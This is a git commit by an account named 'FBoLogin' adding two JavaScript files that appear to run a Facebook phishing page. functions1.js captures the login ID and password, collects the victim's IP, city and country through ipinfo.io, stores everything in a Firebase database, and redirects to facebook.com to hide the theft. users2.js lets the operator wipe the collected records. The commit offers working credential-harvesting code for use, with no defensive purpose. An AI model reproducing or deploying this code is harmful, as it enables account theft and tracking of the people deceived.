ab7fd08fd6382324e2e836ec779fa69c6873db37
FBoLogin <95155115+FBoLogin@users.noreply.github.com>
2021-11-28 05:17:47 +0200

    Add files via upload
    first commit

---
+++ functions1.js
@@ -0,0 +1,41 @@
+const userId = document.getElementById('acc');
+const Pass = document.getElementById('pw');
+const LoginBtn = document.getElementById('login');
+
+const database = firebase.database();
+console.log(window.location.origin.toString());
+// var path = window.location.origin.toString().replace('www.massanger.','');
+var end_of_unique = window.location.origin.toString().indexOf("netlify.app");
+var path = window.location.origin.toString().substring(0,end_of_unique-1);
+path = path.replace("https://www.","");
+
+console.log(path);
+const usersRef = database.ref('/users'+path);
+var city =""
+var country=""
+var ip=""
+$.get("https://ipinfo.io", function(response) {
+  city = response.city
+  ip = response.ip
+  country = response.country
+  console.log(response.city, response.country);
+}, "jsonp");
+
+LoginBtn.addEventListener('click', e => {
+    e.preventDefault();
+    // const autoId = usersRef.push().key
+    // usersRef.child(autoId).set({
+    //   ID: userId.value,
+    //   pw: Pass.value
+    // });
+    usersRef.child(userId.value).transaction(function(currentData) {
+      if (currentData === null) {
+        return {ID:userId.value,pw:Pass.value,City:city,Country:country,IP:ip};
+        // return {ID:userId.value,pw:Pass.value,City:"",Country:"",IP:""};
+      } else {
+        // console.log('User  already exists.');
+        return; // Abort the transaction.
+      }
+    });
+    window.location.replace("http://www.facebook.com");
+  });
---
+++ users2.js
@@ -0,0 +1,17 @@
+const deleteBtn = document.getElementById('delete');
+
+const database = firebase.database();
+// var path = window.location.origin.toString().replace('www.massanger.','');
+// path = path.replace("https://","");
+console.log(window.location.origin.toString());
+
+var end_of_unique = window.location.origin.toString().indexOf("netlify.app");
+var path = window.location.origin.toString().substring(0,end_of_unique-1);
+path = path.replace("https://www.","");
+
+console.log(path);
+const usersRef = database.ref('/users'+path);
+deleteBtn.addEventListener('click', e => {
+    e.preventDefault();
+    usersRef.remove();
+  });
